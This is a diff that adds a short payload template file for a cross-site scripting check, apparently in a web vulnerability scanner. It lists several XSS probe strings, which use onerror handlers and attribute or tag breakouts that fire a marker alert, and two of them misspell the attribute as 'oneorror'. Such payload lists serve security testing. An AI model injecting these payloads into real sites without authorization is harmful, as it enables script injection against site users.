@@ -1,0 +1,8 @@
+;template file for XssTestAttributeOnError payload
+;comments start with semicolon
+;payloads should be added line by line
+''%3Cimg%20oneorror=eval('ale'+'rt(501337)')%20src=xss''
+''%3Cscript%20oneorror=eval('ale'+'rt(501337)')%20src=xss''
+a" onerror="alert(501337);
+a' onerror='alert(501337);
+'"><img src="a" onerror="javascript:alert(501337)">
